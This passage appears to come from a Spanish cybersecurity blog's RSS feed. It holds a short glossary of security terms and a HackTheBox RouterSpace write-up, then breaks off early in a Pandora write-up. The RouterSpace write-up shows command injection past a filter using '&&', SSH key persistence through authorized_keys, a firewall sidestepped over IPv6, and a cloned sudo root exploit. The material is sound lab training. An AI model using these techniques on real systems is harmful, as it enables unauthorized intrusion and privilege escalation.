+  &lt;li&gt;&lt;a href=&quot;https://www.cronup.com/la-importancia-de-los-indicadores-de-compromiso-ioc-en-la-ciberseguridad/&quot;&gt;IoC-CronUP&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://es.wikipedia.org/wiki/Indicador_de_compromiso&quot;&gt;IoC-WikipediA&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;2-soc&quot;&gt;2. SOC&lt;/h2&gt;
+&lt;p&gt;Centro de operaciones de seguridad.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;Digamos que es un grupo de personas que se encarga de monitorizar la red, ya sea analizando el tráfico de red, registros, entre otros (desde un punto de vista de seguridad).&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Si deseas profundizar más acerca de esto. Dejo los siguientes enlaces;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.oracle.com/es/database/security/que-es-un-soc.html&quot;&gt;SOC-ORACLE&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://es.wikipedia.org/wiki/Centro_de_operaciones_de_seguridad&quot;&gt;SOC-WikipediA&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;3-av&quot;&gt;3. AV&lt;/h2&gt;
+&lt;p&gt;Antivirus.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;Simplemente, un antivirus es una solución de seguridad relativamente sofisticada, la cual tiene como fin proteger a un usuario del software malicioso.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Si deseas profundizar más acerca de esto. Dejo los siguientes enlaces;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://es.wikipedia.org/wiki/Antivirus&quot;&gt;AV-WikipediA&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.eset.com/es/caracteristicas/antivirus-software-que-es/&quot;&gt;AV-eset&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;4-malware&quot;&gt;4. Malware&lt;/h2&gt;
+&lt;p&gt;Software malicioso.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;El malware es todo lo que se conoce como software malicioso, es decir que los Virus, Troyanos, Spyware, Ransomware, etc. Es un tipo de malware.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Si deseas profundizar más acerca de esto. Dejo los siguientes enlaces;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.oracle.com/es/database/security/que-es-el-malware.html#:~:text=Malware%20es%20un%20t%C3%A9rmino%20gen%C3%A9rico,contenido%20activo%20y%20otro%20software.&quot;&gt;Malware-Oracle&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://es.wikipedia.org/wiki/Malware&quot;&gt;Malware-WikipediA&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;5-raas&quot;&gt;5. Raas&lt;/h2&gt;
+&lt;p&gt;Ransomware as a Service.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;Generalmente, los ciberdelincuentes utilizan este medio para obtener ingresos económicos a través del servicio de ransomware como servicio, es decir, te “alquilan” un ransomware para que tú puedas realizar tus campañas maliciosas sin necesidad de que tengas grandes conocimientos técnicos.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Si deseas profundizar más acerca de esto. Dejo los siguientes enlaces;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.welivesecurity.com/la-es/2022/02/23/ransomware-as-a-service-raas-que-es-como-funciona/&quot;&gt;Raas-welivesecurity&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.cloudflare.com/es-es/learning/security/ransomware/ransomware-as-a-service/&quot;&gt;Raas-CloudFlare&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;6-rat&quot;&gt;6. RAT&lt;/h2&gt;
+&lt;p&gt;Remote Administration Tool (Herramienta de administración remota).&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;Generalmente, es un software que tiene un fin ético, pero habitualmente se utiliza dicho software de manera maliciosa.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Si deseas profundizar más acerca de esto. Dejo el siguiente enlace;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://es.wikipedia.org/wiki/Troyano_de_acceso_remoto&quot;&gt;RAT-WikipediA&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;7-csirt&quot;&gt;7. CSIRT&lt;/h2&gt;
+&lt;p&gt;Equipo de respuesta ante incidentes de seguridad informática.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;Generalmente, este tipo de equipos los suelen tener «entidades Gubernamentales», Empresas, Gobiernos y alguno que otro más. Como su nombre indica, responden a este tipo de incidentes.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Dejaré el siguiente enlace.&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://csirt.gob.cl/&quot;&gt;CSIRT-Chile&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;8-firewall&quot;&gt;8. Firewall&lt;/h2&gt;
+&lt;p&gt;CortaFuegos.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;Es una «solución de seguridad» que generalmente gestiona el tráfico de red e impide algún tipo de acceso/comunicación a un equipo en una red.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Si deseas profundizar más acerca de esto. Dejo los siguientes enlaces;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.cisco.com/c/en/us/products/security/firewalls/what-is-a-firewall.html&quot;&gt;Fireall-Cisco&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.mcafee.com/es-cl/antivirus/firewall.html&quot;&gt;Firewall-Mcaffe&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;9-ids&quot;&gt;9. IDS&lt;/h2&gt;
+&lt;p&gt;Sistema de detección de intrusos.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;Es una «solución/sistema de seguridad» que genera una alerta en el caso de que un sistema o equipo haya sido comprometido.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Si deseas profundizar más acerca de esto. Dejo los siguientes enlaces;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.incibe.es/protege-tu-empresa/blog/son-y-sirven-los-siem-ids-e-ips&quot;&gt;IDS-Incibe&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://es.wikipedia.org/wiki/Sistema_de_detecci%C3%B3n_de_intrusos&quot;&gt;IDS-WikipediA&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;10-fud&quot;&gt;10. FUD&lt;/h2&gt;
+&lt;p&gt;Totalmente indetectable.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;Generalmente, es software malicioso que tiene el fin de ser indetectables hacia los diferentes motores de AV. Hay diferentes «técnicas» que se emplean para conseguir esto, como la ofuscación, entre otras.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Dejo el siguiente PoC.&lt;/p&gt;
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/MlqSqbMASH4&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;fin&quot;&gt;Fin&lt;/h1&gt;
+&lt;p&gt;Espero te haya gustado, recuerda que más abajo están las reacciones y puedes dejar un comentario.
+&lt;br /&gt;También puedes comunicarte a través de las siguientes vías; &lt;a href=&quot;https://twitter.com/T3_6_9/&quot;&gt;Twitter&lt;/a&gt;, &lt;a href=&quot;https://t.me/T3_6_9/&quot;&gt;Telegram&lt;/a&gt;, &lt;a href=&quot;mailto:t3sla@t3sla.tk&quot;&gt;E-mail&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Trate de poner las fuentes más confiables para los enlaces (Wikipedia es un caso aparte) y al momento de dar ejemplos o definición intente dar una respuesta bajo mis conocimientos y así no es un copia y pega.&lt;/p&gt;
+
+&lt;p&gt;Agregar que si quieres realizar alguna donación lo puedes hacer a través del siguiente botón:
+&lt;script type=&quot;text/javascript&quot; src=&quot;https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js&quot; data-name=&quot;bmc-button&quot; data-slug=&quot;T3sla&quot; data-color=&quot;#BD5FFF&quot; data-emoji=&quot;🍕&quot; data-font=&quot;Lato&quot; data-text=&quot;Buy me a pizza&quot; data-outline-color=&quot;#000000&quot; data-font-color=&quot;#ffffff&quot; data-coffee-color=&quot;#FFDD00&quot;&gt;&lt;/script&gt;&lt;/p&gt;
+
+&lt;p&gt;Y obtén “beneficios”.&lt;/p&gt;
+</description>
+                <pubDate>Thu, 03 Nov 2022 15:40:00 -0300</pubDate>
+                <link>/t%C3%A9rminos-ciberseguridad</link>
+                <guid isPermaLink="true">/t%C3%A9rminos-ciberseguridad</guid>
+                
+                <category>Ciberseguridad</category>
+                
+                <category>T3sla</category>
+                
+                <category>2022</category>
+                
+                
+            </item>
+        
+            <item>
+                <title>RouterSpace HackTheBox</title>
+                <description>&lt;p&gt;Bienvenidos, el artículo de hoy trata sobre la resolución de la máquina RouterSpace.&lt;/p&gt;
+
+&lt;p&gt;Sin más que agregar comencemos.&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;información-sobre-la-máquina&quot;&gt;Información sobre la máquina&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;/images/RouterSpace/inforouter.png&quot; alt=&quot;RouterSpace&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Es una máquina de dificultad fácil, esta máquina es bastante diferente a lo que uno se encuentra normalmente en la plataforma de HackTheBox.&lt;/p&gt;
+
+&lt;h4 id=&quot;matrix&quot;&gt;Matrix&lt;/h4&gt;
+&lt;center&gt;&lt;img src=&quot;/images/RouterSpace/matrix.png&quot; /&gt;&lt;/center&gt;
+&lt;ul&gt;
+  &lt;li&gt;APK&lt;/li&gt;
+  &lt;li&gt;IPv6&lt;/li&gt;
+  &lt;li&gt;SSH&lt;/li&gt;
+  &lt;li&gt;API&lt;/li&gt;
+  &lt;li&gt;Proxy&lt;/li&gt;
+  &lt;li&gt;RCE&lt;/li&gt;
+  &lt;li&gt;PubKey&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;reconocimiento&quot;&gt;Reconocimiento&lt;/h2&gt;
+&lt;h4 id=&quot;nmap-tcp&quot;&gt;Nmap (TCP)&lt;/h4&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.11.148
+nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 80,22 &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; 10.10.11.148 &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; content/nmap
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/RouterSpace/nmap.png&quot; alt=&quot;nmap&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lamentablemente, nmap no logra identificar ninguna versión de los servicios que están corriendo.&lt;/p&gt;
+
+&lt;p&gt;Algo que llama la atención es el siguiente mensaje &lt;strong&gt;«Actividad sospechosa detectada»&lt;/strong&gt; es posible que este protegido por algún tipo de &lt;strong&gt;solución de seguridad&lt;/strong&gt; como lo puede ser un &lt;strong&gt;WaF&lt;/strong&gt; (Web application firewall).&lt;/p&gt;
+
+&lt;h3 id=&quot;servidor-web&quot;&gt;Servidor Web&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;/images/RouterSpace/landingpage.png&quot; alt=&quot;landing page&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Pues obtenemos una &lt;strong&gt;Landing Page&lt;/strong&gt; estática, por lo cual no hay mucho que hacer.&lt;br /&gt;
+Analizando el &lt;strong&gt;HTML5&lt;/strong&gt; obtenemos la siguiente ruta la cual almacena un &lt;strong&gt;APK&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;center&gt;&lt;img src=&quot;/images/RouterSpace/apklanding.png&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;
+Procedo a descargar el &lt;strong&gt;APK&lt;/strong&gt; mediante la utilidad &lt;strong&gt;wget&lt;/strong&gt;.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget http://10.10.11.148/RouterSpace.apk
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/RouterSpace/wget.png&quot; alt=&quot;apk&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Luego analizamos el &lt;strong&gt;APK&lt;/strong&gt; por ahora seguiremos con el &lt;strong&gt;Servidor Web&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h4 id=&quot;fuzzing&quot;&gt;Fuzzing&lt;/h4&gt;
+&lt;p&gt;Nos da la siguiente respuesta el servidor web empleando esta técnica:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/RouterSpace/fuzzing.png&quot; alt=&quot;fuzzing&quot; /&gt;&lt;/p&gt;
+
+&lt;center&gt;&lt;img src=&quot;/images/RouterSpace/waf.png&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;
+Incluso cambiando manualmente el directorio da la misma respuesta.&lt;/p&gt;
+
+&lt;h3 id=&quot;apk&quot;&gt;APK&lt;/h3&gt;
+&lt;p&gt;Volviendo con el &lt;strong&gt;APK&lt;/strong&gt; podemos filtrar la siguiente &lt;strong&gt;cadena de texto&lt;/strong&gt; “HTB” con el propósito de conseguir un &lt;strong&gt;dominio&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/RouterSpace/strings.png&quot; alt=&quot;string&quot; /&gt;
+Perfecto agregamos al &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;vim /etc/hosts | &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;10.10.11.148 routerspace.htb&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/hosts
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;center&gt;&lt;img src=&quot;/images/RouterSpace/resodns.png&quot; /&gt;&lt;/center&gt;
+&lt;blockquote&gt;
+  &lt;p style=&quot;font-size:12px;&quot;&gt;Otra forma de obtener el dominio es a través de una imagen.&lt;/p&gt;
+  &lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/RouterSpace/domain.png&quot; alt=&quot;T3sla RouterSpace HackTheBox Writeup 2022 T3sla Cybersecurity RedTeam Chile&quot; /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Procedemos a instalar el &lt;strong&gt;APK&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/RouterSpace/apkinstall.png&quot; alt=&quot;apkinstall&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/RouterSpace/apkvisu.png&quot; alt=&quot;apkvisu&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora configuramos un &lt;strong&gt;proxy&lt;/strong&gt; en el dispositivo móvil, con el fin de &lt;strong&gt;interceptar&lt;/strong&gt; las diferentes &lt;strong&gt;peticiones&lt;/strong&gt; que realizara el &lt;strong&gt;APK&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Hecho esto obtenemos el siguiente resultado.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/RouterSpace/API.png&quot; alt=&quot;api&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que al presionar el botón &lt;strong&gt;«Check Status»&lt;/strong&gt; realiza una petición &lt;strong&gt;HTTP&lt;/strong&gt; a través del método &lt;strong&gt;POST&lt;/strong&gt;.&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;explotación&quot;&gt;Explotación&lt;/h2&gt;
+&lt;p&gt;Cambiamos el valor del parámetro &lt;strong&gt;IP&lt;/strong&gt; por un comando de &lt;strong&gt;UNIX&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/RouterSpace/whoami.png&quot; alt=&quot;comando&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;No obtenemos ninguna respuesta “llamativa”, lo más probable es qué tenga un &lt;strong&gt;filtro&lt;/strong&gt;, por lo que tendremos que realizar un &lt;strong&gt;bypass&lt;/strong&gt; a dicho &lt;strong&gt;filtro&lt;/strong&gt;.
+&lt;br /&gt;Si quitamos las comillas del parámetro IP obtenemos el siguiente error:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/RouterSpace/apierror.png&quot; alt=&quot;apierror&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;bypass-filtro&quot;&gt;Bypass filtro&lt;/h3&gt;
+&lt;p&gt;Acudo a utilizar el &lt;strong&gt;operador lógico&lt;/strong&gt; AND (&amp;amp;&amp;amp;).&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/RouterSpace/bypass.png&quot; alt=&quot;bypass&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Genial obtenemos lo que parece ser ejecución remota de comandos.&lt;/p&gt;
+
+&lt;h4 id=&quot;flag-user&quot;&gt;Flag User&lt;/h4&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/user&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/RouterSpace/user.png&quot; alt=&quot;user&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;No podemos obtener una Reverse Shell, ya que seguramente tiene alguna &lt;strong&gt;regla&lt;/strong&gt; el &lt;strong&gt;firewall&lt;/strong&gt; que impide &lt;strong&gt;conexiones entrantes&lt;/strong&gt;.
+&lt;br /&gt;En cuanto a &lt;strong&gt;ficheros de identificación&lt;/strong&gt; no hay nada, pero como tenemos permisos de &lt;strong&gt;escritura&lt;/strong&gt; en el directorio &lt;code&gt;~/.ssh&lt;/code&gt; podemos añadir una &lt;strong&gt;clave pública&lt;/strong&gt; de nuestro equipo y así conectarnos a la &lt;strong&gt;máquina&lt;/strong&gt; sin &lt;strong&gt;proporcionar&lt;/strong&gt; ningún tipo de &lt;strong&gt;credencial&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/RouterSpace/idssh.png&quot; alt=&quot;idssh&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh-keygen
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/RouterSpace/key-gen.png&quot; alt=&quot;key-gen&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ya &lt;strong&gt;generada&lt;/strong&gt; nuestra &lt;strong&gt;pubkey&lt;/strong&gt; procedemos a añadir a &lt;code&gt;authorized_keys&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/RouterSpace/keypub.png&quot; alt=&quot;pubkey&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/RouterSpace/idauth.png&quot; alt=&quot;authorized_keys&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh paul@routerspace.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/RouterSpace/sshpaul.jpg&quot; alt=&quot;sshpaul&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de privilegios&lt;/h2&gt;
+&lt;p&gt;Luego de estar enumerando un poco el sistema nos percatamos de la que la versión de sudo es vulnerable, por lo cual procedemos a probar el exploit.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/RouterSpace/sudo.png&quot; alt=&quot;sudo&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Clonamos el siguiente repositorio.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit.git &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;Sudo-1.8.31-Root-Exploit.git &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; make
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;transferencia-de-archivos&quot;&gt;Transferencia de archivos&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/RouterSpace/http.png&quot; alt=&quot;http&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nuevamente, nos limita el Firewall.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/RouterSpace/icmp.png&quot; alt=&quot;icmp&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si nos ponemos a pensar todo lo que hemos hecho es con respecto a &lt;strong&gt;IPv4&lt;/strong&gt;, pero que pasa si las &lt;strong&gt;reglas&lt;/strong&gt; de firewall solamente están &lt;strong&gt;aplicadas&lt;/strong&gt; para esa &lt;strong&gt;versión&lt;/strong&gt; y no en &lt;strong&gt;IPv6&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h4 id=&quot;bypass-firewall&quot;&gt;Bypass Firewall&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/RouterSpace/ipv6.png&quot; alt=&quot;ipv6&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Genial logramos evadir el firewall, fácil no. 😎&lt;/p&gt;
+
+&lt;h4 id=&quot;ejecución-del-exploit&quot;&gt;Ejecución del exploit.&lt;/h4&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/RouterSpace/root.png&quot; alt=&quot;root&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Listo, ya obtuvimos una Shell como root.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/RouterSpace/rootflag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;fin&quot;&gt;Fin&lt;/h1&gt;
+&lt;p&gt;Espero te haya gustado, recuerda que más abajo están las reacciones y puedes dejar un comentario.
+&lt;br /&gt;También puedes comunicarte a través de las siguientes vías;
+&lt;a href=&quot;https://twitter.com/T3_6_9/&quot;&gt;Twitter&lt;/a&gt;, &lt;a href=&quot;https://t.me/T3_6_9/&quot;&gt;Telegram&lt;/a&gt;, &lt;a href=&quot;mailto:t3sla@t3sla.tk&quot;&gt;E-mail&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Agregar que si quieres realizar alguna donación lo puedes hacer a través del siguiente botón:
+&lt;script type=&quot;text/javascript&quot; src=&quot;https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js&quot; data-name=&quot;bmc-button&quot; data-slug=&quot;T3sla&quot; data-color=&quot;#BD5FFF&quot; data-emoji=&quot;🍕&quot; data-font=&quot;Lato&quot; data-text=&quot;Buy me a pizza&quot; data-outline-color=&quot;#000000&quot; data-font-color=&quot;#ffffff&quot; data-coffee-color=&quot;#FFDD00&quot;&gt;&lt;/script&gt;&lt;/p&gt;
+
+&lt;p&gt;Y obtén “beneficios”.&lt;/p&gt;
+</description>
+                <pubDate>Wed, 02 Nov 2022 23:16:00 -0300</pubDate>
+                <link>/routerspace-hackthebox</link>
+                <guid isPermaLink="true">/routerspace-hackthebox</guid>
+                
+                <category>Writeup</category>
+                
+                <category>HackTheBox</category>
+                
+                <category>T3sla</category>
+                
+                <category>2022</category>
+                
+                
+            </item>
+        
+            <item>
+                <title>Pandora HackTheBox</title>
+                <description>&lt;p&gt;Bienvenidos, este es el primer writeup del blog, el cual tratara la resolución de la máquina Pandora.&lt;/p&gt;
+
+&lt;p&gt;Sin más que agregar comencemos.&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;información-sobre-la-máquina&quot;&gt;Información sobre la máquina&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;/images/Pandora/infopandora.png&quot; alt=&quot;Pandora&quot; /&gt;
+Esta máquina tiene dificultad fácil, pero desde mi punto de vista no es una máquina fácil.&lt;br /&gt;
+Una máquina bastante divertida donde se tocan bastantes tópicos y como información extra sin relevancia es mi máquina favorita.&lt;/p&gt;
+
+&lt;h4 id=&quot;matrix&quot;&gt;Matrix&lt;/h4&gt;
+&lt;center&gt;&lt;img src=&quot;/images/Pandora/matrixpandora.png&quot; /&gt;&lt;/center&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;SQLI&lt;/li&gt;
+  &lt;li&gt;SNMP&lt;/li&gt;
+  &lt;li&gt;UDP&lt;/li&gt;
+  &lt;li&gt;PATH Hijacking&lt;/li&gt;
+  &lt;li&gt;CVE-2021-32099&lt;/li&gt;
+  &lt;li&gt;Local Port Forwarding&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;reconocimiento&quot;&gt;Reconocimiento&lt;/h2&gt;
+
+&lt;h4 id=&quot;nmap-tcp---udp&quot;&gt;Nmap (TCP - UDP)&lt;/h4&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sSU&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 12000 &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 10.10.11.136
